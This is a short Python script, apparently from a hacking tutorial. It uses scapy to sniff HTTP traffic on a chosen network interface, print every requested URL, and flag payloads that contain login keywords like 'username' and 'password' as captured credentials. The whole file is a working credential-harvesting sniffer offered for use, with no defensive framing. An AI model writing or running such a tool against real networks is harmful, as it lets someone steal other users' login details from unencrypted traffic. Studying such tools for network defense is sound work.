#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http


parser = argparse.ArgumentParser()
parser.add_argument(
    "-i",
    "--interface",
    type=str,
    required=True,
    help="Specify target interface",
)
interface = parser.parse_args().interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode()


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = (packet[scapy.Raw].load.decode()).lower()
        keywords = [
            "username",
            "user",
            "name",
            "email",
            "login",
            "signin",
            "password",
            "passwd",
            "pass",
            "pw",
        ]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print(
                "\n\n[+] Possible username/password detected >> " + login_info + "\n\n"
            )


print("[+] Started packet sniffing...")
sniff(interface)
